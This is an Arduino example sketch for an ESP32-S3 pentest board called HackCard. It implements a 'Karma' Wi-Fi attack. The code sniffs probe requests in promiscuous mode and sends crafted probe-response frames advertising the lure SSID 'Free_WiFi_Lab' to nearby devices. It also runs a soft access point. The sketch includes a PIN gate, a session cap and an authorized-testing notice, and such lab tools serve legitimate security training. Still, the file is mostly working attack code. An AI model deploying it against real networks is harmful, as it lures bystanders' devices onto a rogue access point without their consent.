/*
 * HackCard release 1.0.0 example
 * -------------------------------------------------------------------------
 * FEATURE: Karma lab
 * FULL FIRMWARE: /wifi Attack -> Karma
 *
 * WHAT IT DOES:
 * Soft AP plus probe-response lure SSID (capped session).
 *
 * BEFORE UPLOAD (Arduino IDE -> Tools):
 *   Board ................ ESP32S3 Dev Module
 *   USB CDC On Boot ...... Enabled
 *
 * HOW TO RUN:
 *   1. File -> Examples -> HackCard -> (this sketch's folder)
 *   2. Edit constants marked EDIT ME at top of file.
 *   3. Upload and open Serial Monitor @ 115200 baud
 *   4. Type PIN to start; type stop to end early.
 *
 * LIBRARIES: HackCard, WiFi, esp_wifi
 * INDEX: library/HackCard/EXAMPLES.md | docs/CUSTOM_DEVELOPMENT.md
 * ETHICS: Authorized testing only - networks/tags/PCs you own or have permission to test.
 */

#include <HackCard.h>
#include <WiFi.h>
#include <esp_wifi.h>

// ── EDIT ME ────────────────────────────────────────────
static const char* kLabPin = "1234";
static const char* kApSsid = "HackCard-Karma";
static const char* kApPass = "hackcard2026";
static const char* kLureSsid = "Free_WiFi_Lab";  // SSID in probe responses
static const uint32_t kSessionMs = 3U * 60U * 1000U;
static const uint16_t kMaxResponses = 40;
// ──────────────────────────────────────────────────────

static volatile bool gRunning = false;
static volatile uint32_t gProbes = 0;
static volatile uint16_t gSent = 0;
static uint32_t gEndsMs = 0;

struct ProbeEntry {
  uint8_t mac[6];
  uint8_t channel;
};

static ProbeEntry gQueue[8];
static volatile uint8_t gHead = 0;
static volatile uint8_t gTail = 0;

static bool frameIsProbeRequest(const uint8_t* payload, uint16_t len, uint8_t srcMac[6]) {
  if (!payload || len < 24) {
    return false;
  }
  const uint8_t frameType = (payload[0] >> 2) & 0x03;
  const uint8_t subtype = (payload[0] >> 4) & 0x0F;
  if (frameType != 0 || subtype != 4) {
    return false;
  }
  memcpy(srcMac, payload + 10, 6);
  return true;
}

void IRAM_ATTR onPromiscuous(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!gRunning || !buf) {
    return;
  }
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_MISC) {
    return;
  }
  const wifi_promiscuous_pkt_t* pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
  uint8_t mac[6];
  if (!frameIsProbeRequest(pkt->payload, pkt->rx_ctrl.sig_len, mac)) {
    return;
  }
  gProbes++;
  const uint8_t next = static_cast<uint8_t>((gHead + 1) % 8);
  if (next == gTail) {
    return;
  }
  memcpy(gQueue[gHead].mac, mac, 6);
  gQueue[gHead].channel = pkt->rx_ctrl.channel;
  gHead = next;
}

static bool sendProbeResponse(const char* ssid, const uint8_t* destMac, uint8_t channel) {
  if (!ssid || !destMac) {
    return false;
  }
  const uint8_t bssid[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
  const size_t ssidLen = strnlen(ssid, 32);
  uint8_t frame[128];
  int pos = 0;
  frame[pos++] = 0x50;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  memcpy(&frame[pos], destMac, 6);
  pos += 6;
  memcpy(&frame[pos], bssid, 6);
  pos += 6;
  memcpy(&frame[pos], bssid, 6);
  pos += 6;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;
  frame[pos++] = static_cast<uint8_t>(100);
  frame[pos++] = 0x00;
  frame[pos++] = 0x01;
  frame[pos++] = 0x08;
  frame[pos++] = 0x82;
  frame[pos++] = 0x84;
  frame[pos++] = 0x8b;
  frame[pos++] = 0x96;
  frame[pos++] = 0x0c;
  frame[pos++] = 0x12;
  frame[pos++] = 0x18;
  frame[pos++] = 0x24;
  frame[pos++] = 0x03;
  frame[pos++] = 0x01;
  frame[pos++] = channel > 0 ? channel : static_cast<uint8_t>(1);
  frame[pos++] = 0x00;
  frame[pos++] = static_cast<uint8_t>(ssidLen);
  memcpy(&frame[pos], ssid, ssidLen);
  pos += static_cast<int>(ssidLen);
  if (channel > 0) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  }
  return esp_wifi_80211_tx(WIFI_IF_AP, frame, pos, false) == ESP_OK;
}

static void drainQueue() {
  while (gTail != gHead && gSent < kMaxResponses) {
    ProbeEntry& e = gQueue[gTail];
    if (sendProbeResponse(kLureSsid, e.mac, e.channel)) {
      gSent++;
      Serial.printf("probe-response #%u → %s (ch %u)\n", gSent, kLureSsid, e.channel);
    }
    gTail = static_cast<uint8_t>((gTail + 1) % 8);
  }
}

static void startKarma() {
  gProbes = 0;
  gSent = 0;
  gHead = 0;
  gTail = 0;
  gRunning = true;
  gEndsMs = millis() + kSessionMs;

  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&onPromiscuous);
  esp_wifi_set_promiscuous(true);

  Serial.println("Karma session started.");
  RgbRing.setPattern(RingPattern::Scanning);
  WifiLed.setState(WifiLedState::Scanning);
}

static void stopKarma() {
  gRunning = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  drainQueue();
  Serial.printf("Karma stopped. probes=%lu responses=%u\n",
                (unsigned long)gProbes, (unsigned)gSent);
  RgbRing.setPattern(RingPattern::Idle);
  WifiLed.setState(WifiLedState::ApActive);
}

// setup() - board init, Serial, peripherals
void setup() {
  Serial.begin(115200);
  delay(800);
  Serial.println();
  Serial.println("HackCard — Karma Lab (web: /wifi attack karma)");
  Serial.println("Training / authorized lab only.");

  RgbRing.begin(50);
  WifiLed.begin(70);
  Buzzer.begin(true);

  WiFi.mode(WIFI_AP);
  if (!WiFi.softAP(kApSsid, kApPass)) {
    Serial.println("ERROR: softAP failed");
    RgbRing.setPattern(RingPattern::Error);
    return;
  }
  Serial.printf("AP %s — lure SSID \"%s\"\n", kApSsid, kLureSsid);
  Serial.printf("Type PIN (%s) to start %lu s session...\n", kLabPin, (unsigned long)(kSessionMs / 1000));
  WifiLed.setState(WifiLedState::ApActive);
  RgbRing.setPattern(RingPattern::Idle);
}

// loop() - keep calling Hal*.update() here
void loop() {
  RgbRing.update();
  WifiLed.update();

  if (gRunning) {
    drainQueue();
    if (millis() >= gEndsMs || gSent >= kMaxResponses) {
      stopKarma();
      Buzzer.playSuccess();
    }
  }

  if (!Serial.available()) {
    return;
  }
  String pin = Serial.readStringUntil('\n');
  pin.trim();
  if (pin == "stop") {
    if (gRunning) {
      stopKarma();
    }
    return;
  }
  if (pin != kLabPin) {
    Serial.println("PIN rejected (or type stop).");
    Buzzer.playError();
    return;
  }
  if (gRunning) {
    Serial.println("Already running.");
    return;
  }
  startKarma();
  Buzzer.playNfcReady();
}
